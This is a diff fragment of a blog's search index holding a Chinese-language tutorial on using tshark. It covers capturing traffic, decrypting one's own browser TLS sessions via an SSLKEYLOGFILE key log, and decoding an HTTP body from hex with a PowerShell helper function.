+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">tshark <span class="literal">-i</span> [網路介面編號] <span class="literal">-T</span> fields <span class="literal">-e</span> ip.src <span class="literal">-e</span> ip.dst <span class="literal">-e</span> tcp.port</span><br></pre></td></tr></table></figure>
+<h1 id="解析-TLS"><a class="header-anchor" href="#解析-TLS"></a>解析 TLS</h1>
+<p>設定環境變數讓瀏覽器緩存 SSL KEY 至指定檔案</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">setx SSLKEYLOGFILE <span class="string">&quot;C:\path\to\sslkeys.log&quot;</span></span><br></pre></td></tr></table></figure>
+<p>緩存封包</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">tshark <span class="literal">-i</span> [網路介面編號] <span class="literal">-w</span> https_traffic.pcapng</span><br></pre></td></tr></table></figure>
+<p>使用指定 SSL KEY 讀取檔案</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">tshark <span class="literal">-r</span> https_traffic.pcapng <span class="literal">-o</span> tls.keylog_file:<span class="string">&quot;C:\path\to\sslkeys.log&quot;</span></span><br></pre></td></tr></table></figure>
+<h1 id="解析-Body"><a class="header-anchor" href="#解析-Body"></a>解析 Body</h1>
+<p>解析 HTTP Body，存入變數 hex</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$hex</span> = tshark <span class="literal">-r</span> https_traffic.pcapng `</span><br><span class="line">			  <span class="literal">-Y</span> <span class="string">&#x27;http.request.method == &quot;[HTTP的方法]&quot; &amp;&amp; http.request.uri == \&quot;[URL連結]\&quot;&#x27;</span> `</span><br><span class="line">              <span class="literal">-T</span> fields <span class="literal">-e</span> http.file_data `</span><br><span class="line">              <span class="literal">-o</span> tls.keylog_file:<span class="string">&quot;C:\path\to\sslkeys.log&quot;</span></span><br></pre></td></tr></table></figure>
+<p>建立方法解析 Hex</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Convert-HexToUtf8String</span></span> &#123;</span><br><span class="line">    <span class="keyword">param</span>([<span class="built_in">string</span>]<span class="variable">$hex</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 移除所有非十六進位字元（保險做法）</span></span><br><span class="line">    <span class="variable">$cleanHex</span> = <span class="variable">$hex</span> <span class="operator">-replace</span> <span class="string">&#x27;[^0-9a-fA-F]&#x27;</span>, <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$cleanHex</span>.Length % <span class="number">2</span> <span class="operator">-ne</span> <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="string">&quot;Hex string 長度為奇數，無法正確解碼。&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$bytes</span> = <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> <span class="operator">-lt</span> <span class="variable">$cleanHex</span>.Length; <span class="variable">$i</span> += <span class="number">2</span>) &#123;</span><br><span class="line">        [<span class="type">Convert</span>]::ToByte(<span class="variable">$cleanHex</span>.Substring(<span class="variable">$i</span>, <span class="number">2</span>), <span class="number">16</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> [<span class="type">System.Text.Encoding</span>]::UTF8.GetString(<span class="variable">$bytes</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>Hex 轉文字</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$decoded</span> = <span class="built_in">Convert-HexToUtf8String</span> <span class="literal">-hex</span> <span class="variable">$hex</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$decoded</span></span><br></pre></td></tr></table></figure>
+<div class="note warning"><p>📜 參考資料</p>
+<ol>
+<li><a href="https://www.wireshark.org/docs/man-pages/tshark.html">tshark(1) Manual Page</a></li>
+</ol>
+</div>]]></content>
+      <categories>
+        <category>Tool</category>
+      </categories>
+      <tags>
+        <tag>Tool</tag>
+        <tag>Wireshark</tag>
       </tags>
   </entry>
 </search>
